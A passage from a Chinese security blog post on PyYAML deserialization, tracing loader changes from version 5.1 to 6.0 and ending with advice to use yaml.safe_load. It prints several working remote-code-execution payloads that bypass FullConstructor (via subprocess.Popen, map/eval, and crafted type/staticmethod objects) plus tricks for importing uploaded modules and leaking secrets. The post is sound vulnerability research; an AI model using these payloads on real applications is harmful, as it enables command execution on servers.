+<p>所以这很明显是一个 bug，因为这个流程既然存在就必定会走到，而现在一旦走到就必然报错。查了下 issue，发现在 18 年的时候就已经发现了：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/c4647a3e-2d2b-4604-8113-6fc798175a93.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>的确，应该是 <code>setattr(instance, key, value)</code>。这个 bug 在 5.3 已修复了。</p>
+<h4 id="pythonmodule">python/module</h4>
+<p>对应的函数是 <code>construct_python_module</code>，里面调用了 <code>find_python_module</code>，等价于 <code>import</code>。</p>
+<p>那么在这种没有调用逻辑的情况下，是否有办法利用呢？我感觉在可以写任意文件的时候是有办法的。比如搭配任意文件上传。</p>
+<p>首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 <code>exp.py</code>，然后通过 <code>yaml.load('!!python/module:exp')</code> 加载。</p>
+<p>在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">app.py<br>uploads<br>  <span class="hljs-string">|_ user.png</span><br>  <span class="hljs-string">|_ header.jpg</span><br></code></pre></td></tr></table></figure>
+<p>这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 <code>import uploads.header</code> 就可以利用了：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/a2aa2bd6-27cc-4d0c-aa6a-4b894ae35514.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>更简单的，直接上传 <code>__init__.py</code>，在触发的时候用 <code>!!python/module:uploads</code> 就可以了。</p>
+<h4 id="pythonname">python/name</h4>
+<p>对应的函数是 <code>construct_python_name</code>，里面调用了 <code>find_python_name</code>，与 <code>python/module</code> 的逻辑极其类似，区别在于，<code>python/module</code> 仅仅返回模块而 <code>python/name</code> 返回的是模块下面的属性/方法。</p>
+<p>利用的逻辑除了上面一样之外，还可以用于这种场景：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br><br>TOKEN = <span class="hljs-string">&quot;Y0u_Nev3r_kn0w.&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">config</span>):<br>    <span class="hljs-keyword">try</span>:<br>        token = yaml.load(config).get(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        token = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> token == TOKEN:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes, master.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fuck off!&quot;</span>)<br><br><br>config = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 可控输入点</span><br>check(config)<br></code></pre></td></tr></table></figure>
+<p>这个时候的 payload 为 <code>token: !!python/name:__main__.TOKEN</code>，无需知道 TOKEN 是什么，但是需要知道变量名。</p>
+<p>当然，这个场景除了 <code>!!python/module</code> 无法完成利用之外，上述其他姿势都可以实现。</p>
+<h3 id="版本大于等于-5.1">版本大于等于 5.1</h3>
+<p>由于默认的构造器太过强大，开发人员不了解这些危险很容易中招。所以 PyYAML 的开发者就将构造器分为：</p>
+<ol type="1">
+<li><code>BaseConstructor</code>：没有任何强制类型转换</li>
+<li><code>SafeConstructor</code>：只有基础类型的强制类型转换</li>
+<li><code>FullConstructor</code>：除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。</li>
+<li><code>UnsafeConstructor</code>：支持全部的强制类型转换</li>
+<li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li>
+</ol>
+<p>对应顶层的方法新增了：</p>
+<ol type="1">
+<li><code>yaml.full_load</code></li>
+<li><code>yaml.full_load_all</code></li>
+<li><code>yaml.unsafe_load</code></li>
+<li><code>yaml.unsafe_load_all</code></li>
+</ol>
+<p>通常情况下，我们还是会使用 <code>yaml.load</code>，这个时候会有 warning：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/74750255-05b5-44fe-89fa-56f84fff1b78.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>因为在不指定 <code>Loader</code> 的时候，默认是 <code>FullConstructor</code> 构造器。这对开发人员起到了提醒的作用。</p>
+<p>除此之外，在 <code>make_python_instance</code> 还新增的额外的限制：<code>if not (unsafe or isinstance(cls, type))</code>，也就是说，在安全模式下，加载进来的 <code>module.name</code> 必须是一个类（例如 <code>int</code>、<code>str</code> 之类的），否则就会报错。</p>
+<h3 id="常规利用方式">常规利用方式</h3>
+<p>常规的利用方式和 &lt;5.1 版本的姿势是一样的。当然前提是构造器必须用的是 <code>UnsafeConstructor</code> 或者 <code>Constructor</code>，也就是这种情况：</p>
+<ol type="1">
+<li><code>yaml.unsafe_load(exp)</code></li>
+<li><code>yaml.unsafe_load_all(exp)</code></li>
+<li><code>yaml.load(exp, Loader=UnsafeLoader)</code></li>
+<li><code>yaml.load(exp, Loader=Loader)</code></li>
+<li><code>yaml.load_all(exp, Loader=UnsafeLoader)</code></li>
+<li><code>yaml.load_all(exp, Loader=Loader)</code></li>
+</ol>
+<p>直接打就好了。</p>
+<h3 id="突破-fullconstructor">突破 FullConstructor</h3>
+<p>FullConstructor 中，限制了只允许加载 <code>sys.modules</code> 中的模块。这个有办法突破吗？我们先列举一下限制：</p>
+<ol type="1">
+<li>只引用，不执行的限制：
+<ol type="1">
+<li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li>
+</ol></li>
+<li>引用并执行：
+<ol type="1">
+<li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li>
+<li>FullConstructor 下，<code>unsafe = False</code>，加载进来的 <code>module.name</code> 必须是一个类</li>
+</ol></li>
+</ol>
+<p>举两个不行的例子：</p>
+<ol type="1">
+<li><code>!!python/name:pickle.loads</code>：<code>pickle</code> 不在 <code>sys.modules</code> 中</li>
+<li><code>!!python/object/new:builtins.eval ["print(1)"]</code>：<code>eval</code> 虽然在 <code>sys.modules</code> 中，但是 <code>type(builtins.eval)</code> 是 <code>builtin_function_or_method</code> 而不是一个类。</li>
+</ol>
+<p>那么最直接的思路就是，有没有一个模块，它在 FullConstructor 上下文中的 <code>sys.modules</code> 里，同时它还有一个类，这个类可以执行命令？答案就是 <code>subprocess.Popen</code>。所以最简单的 payload 就是：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:subprocess.Popen</span><br><span class="hljs-string">  - whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>不用 <code>!!python/object/apply</code> 的话，也有其他办法。</p>
+<p>通过遍历 builtins 下的所有方法，可以找到这些看起来有点用的：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">bool</span>、<span class="hljs-built_in">bytearray</span>、<span class="hljs-built_in">bytes</span><br><span class="hljs-built_in">complex</span><br><span class="hljs-built_in">dict</span><br><span class="hljs-built_in">enumerate</span><br><span class="hljs-built_in">filter</span>、<span class="hljs-built_in">float</span>、<span class="hljs-built_in">frozenset</span><br><span class="hljs-built_in">int</span><br><span class="hljs-built_in">list</span><br><span class="hljs-built_in">map</span>、<span class="hljs-built_in">memoryview</span><br><span class="hljs-built_in">object</span><br><span class="hljs-built_in">range</span>、<span class="hljs-built_in">reversed</span><br><span class="hljs-built_in">set</span>、<span class="hljs-built_in">slice</span>、<span class="hljs-built_in">str</span>、<span class="hljs-built_in">staticmethod</span><br><span class="hljs-built_in">tuple</span><br><span class="hljs-built_in">zip</span><br></code></pre></td></tr></table></figure></p>
+<p>其中，<code>map</code> 是可以用来触发函数执行的，那么函数怎么引用进来呢？很明显就是 <code>python/name</code>，所以这个 payload 的原型就可以是：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br></code></pre></td></tr></table></figure></p>
+<p>翻译为 YAML 即为：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>这里有个非常有趣的地方，如果把 <code>tuple</code> 换成 <code>list</code> 或者是 <code>set</code>，理论上同样会解开 map 里的内容：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/342671db-24bb-431c-9a4e-2ce809fc71b6.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>但是通过 <code>!!python/object/new</code> 来使用时却会忽略参数，生成一个空的迭代对象：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/dae3bf71-db1c-4962-aea3-195cbc1f5dd8.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>可以看到，上面并没有执行命令（只要尝试解开 payload 里的 map 必定会执行命令）。跟踪执行流程并审计源码可以发现，在 <code>make_python_instance</code> 中，这也是为什么我上面说这个条件比较特殊。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/d8f60d96-f82d-4b91-9b12-735abbbc475b.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>可以看到，这里是通过 <code>cls.__new__</code> 来新建一个 cls 实例的，因为 FullConstructor 下使用 <code>python/object/new</code> 时，newobj 必定是 <code>True</code>，而后面那个条件必定是满足的，否则上面一个条件就会报错。</p>
+<p>所以到这里我们就可以复现这个 “bug”：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/58f754f0-a23c-4913-a8dc-ee57f64f3ebc.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>那么为什么通过 <code>list.__new__</code> 会忽略元素参数，而 <code>tuple.__new__</code> 却不会呢？</p>
+<p>通过审计 Python 的 C 代码，对比 list 和 tuple 的底层实现，大致可以得出这么一个结论：由于 <code>__new__</code> 的调用在 <code>__init__</code> 之前，所以我猜测不可变类型是在 <code>__new__</code> 时插入元素，而可变类型是在 <code>__init__</code> 时插入元素，所以 <code>__new__</code> 时传入的元素参数就被忽略了，而 <code>__init__</code> 又没有接收到元素，所以就生成了一个空的实例。<strong>注意，这个结论由于精力原因，并没有经过严格的考证，若感兴趣橘友们应当自行跟踪调试。</strong></p>
+<p>所以 <code>frozenset</code>、<code>bytes</code> 等这种不可变类型都会解开里面的元素从而触发命令执行，而 <code>dict</code>、<code>bytearray</code> 等这种可变类型就不会：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/70d23eee-bddc-4ab3-a0a5-a7acfe5932c2.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>所以，我们只需要找到 触发带参调用 + 引入函数 这两个点就可以完成攻击。在 <code>construct_python_object_apply</code> 中，不仅进行了实例化，如果有 <code>listitems</code> 还会调用实例的 <code>extend</code> 方法，所以原型是：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>YAML payload:<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>结果：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/11e9e1a9-eb9c-4cbf-a5b7-b18feef4e286.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p><code>construct_python_object_apply</code> 中还对实例进行 setstate，即调用了 <code>__setstate__</code>，所以同样的思路，原型：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (<span class="hljs-built_in">list</span>, ), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>YAML payload:<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>这里的 <code>type</code> 也可以用 <code>staticmethod</code> 来替换。例如，在 <code>set_python_instance_state</code> 中，还有个调用 <code>slotstate.update</code> 的逻辑，那么只要将 <code>slotstate.update</code> 置为 <code>eval</code>，<code>state</code> 就是 RCE 的 payload。原型：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">staticmethod</span>([<span class="hljs-number">0</span>])<br>exp.__dict__.update(<br>    &#123;<span class="hljs-string">&quot;update&quot;</span>: <span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;items&quot;</span>: <span class="hljs-built_in">list</span>&#125;<br>)<br>exp_raise = <span class="hljs-built_in">str</span>()<br><span class="hljs-comment"># 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用</span><br><br>exp.update(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>YAML payload:<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    # 通过 state 触发调用</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      # 下面构造 exp</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state: </span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>这个稍微复杂一些。</p>
+<p>总之这个组合拳用来绕过 FullConstructor 是很简单的。</p>
+<h3 id="版本大于等于-5.2">版本大于等于 5.2</h3>
+<p>FullConstructor 现在只额外支持 <code>!!python/name</code>、<code>!!python/object</code>、<code>!!python/object/new</code> 和 <code>!!python/module</code>，<code>!!python/object/apply</code> G 了。</p>
+<h3 id="版本大于等于-5.3.1">版本大于等于 5.3.1</h3>
+<blockquote>
+<p>2022.6.29 本文更新</p>
+</blockquote>
+<p>5.3.1 引入了一个新的过滤机制，本质上就是实现一个属性名黑名单（正则），匹配到就报错。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/20220629170947.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>见：https://github.com/yaml/pyyaml/pull/386</p>
+<p>简单，粗暴。</p>
+<h3 id="版本大于等于-5.4">版本大于等于 5.4</h3>
+<blockquote>
+<p>2022.6.29 本文更新</p>
+</blockquote>
+<p>FullConstructor 现在只额外支持 <code>!!python/name</code>，<code>!!python/object/apply</code>、<code>!!python/object</code>、<code>!!python/object/new</code> 和 <code>!!python/module</code> 都 G 了。</p>
+<h3 id="版本大于等于-6.0">版本大于等于 6.0</h3>
+<blockquote>
+<p>2022.6.29 本文更新</p>
+</blockquote>
+<p>现在在使用 <code>yaml.load</code> 时，用户必须指定 Loader。这个改进其实有点强硬，所以引发了一堆 issue，还有人在直接开怼认为这是糟糕的设计。但是至少安全性上来说，相比给一个告警，确实得到了一定提升。</p>
+<p>issue 见：https://github.com/yaml/pyyaml/issues/576</p>
+<h2 id="防御">防御</h2>
+<p>我感觉大多数时候没必要使用如此灵活的解析，所以作为研发，可以尽量使用 <code>yaml.safe_load</code> 来做解析，这一点没啥可说的。</p>
+<p>写完这一切之后，我在官方 issue 中看到了关于 &gt;5.1 的 <code>yaml.full_load</code> 安全问题的讨论，这个是默认方法却存在漏洞。作为安全人员，我的观点是官方提供的默认方法应该是安全的，即使牺牲了部分功能。如果一定需要使用那些不太安全的功能也可以，但是需要主动开启（例如加额外的参数，或者换方法名），否则大多数人都会使用 full_load，毕竟是默认的方法。我感觉打印警告起到的作用还是稍微弱了一些。</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">本来周一就有周末综合征<br>又叠加了一个节后综合征<br>buff 叠满了</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/SecMap/">#SecMap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SecMap - 反序列化（PyYAML）</div>
+      <div>https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月15日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/27/OrangeKiller_CTF_2/" title="OrangeKiller CTF 第 2 期">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OrangeKiller CTF 第 2 期</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/30/xsleaks-wiki-zh_CN/" title="xsleaks wiki 中文版发布">
+                        <span class="hidden-mobile">xsleaks wiki 中文版发布</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
